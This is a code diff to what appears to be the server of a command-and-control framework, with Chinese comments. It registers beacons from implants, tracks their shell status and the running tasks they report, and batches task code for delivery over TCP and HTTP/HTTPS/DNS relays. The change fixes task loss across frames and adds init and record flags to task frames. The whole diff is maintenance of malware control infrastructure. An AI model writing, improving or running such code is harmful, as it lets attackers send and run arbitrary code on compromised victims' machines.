@@ -50,6 +50,7 @@ def register_beacon(reg: dict, mgr, events) -> tuple:
         if is_fork:
             rec.is_fork = True
         rec.is_shell = is_shell
+        rec.running_tasks = list(reg.get("running") or [])  # 植入物上报的运行中任务
         rec.active = True
     events.emit(EVT_CONNECT, client_id, first=bool(is_new), via=via or None,
                 fork=is_fork or None, shell=is_shell or None)
@@ -106,20 +107,12 @@ def build_auto_tasks(commands, client_id, dispatcher) -> list:
     return tasks
 
 
-def drain_tasks(client_id: str, tq) -> list:
-    """弹出某 beacon 的全部待执行任务（FIFO 顺序）。批量模型:一次下发全部。"""
-    tasks = []
-    while True:
-        task = tq.pop(client_id)
-        if task is None:
-            return tasks
-        tasks.append(task)
-
-
 def take_task_batch(client_id: str, tq, budget: int) -> list:
     """按字节预算弹出一批任务（超预算的任务放回队头,下次再取）。
 
-    无状态通道(HTTPS/DNS)每次响应只能回一帧,用它分批领取;
+    TCP 批量会话与无状态中继(agent_http/https/dns)共用:每次会话只取
+    一批、发一帧——剩余任务留在队列,下次回连再拉(旧 drain 全量+拆帧
+    在多帧场景丢任务,2026-08-27 修复)。
     预算近似 = task_id + code 长度 + 帧开销余量。
     """
     tasks, size = [], 0
@@ -165,7 +158,11 @@ def batch_response(acked: list, tasks: list, budget: int) -> list:
     first = True
     for batch in pack_tasks_batch(tasks, budget):
         frames.append({
-            "tasks": [{"task_id": t.task_id, "code": t.code} for t in batch],
+            "tasks": [
+                {"task_id": t.task_id, "code": t.code,
+                 **({"init": True} if getattr(t, "is_init", False) else {}),
+                 **({"record": True} if getattr(t, "record", False) else {})}
+                for t in batch],
             "acked": list(acked) if first else [],
         })
         first = False
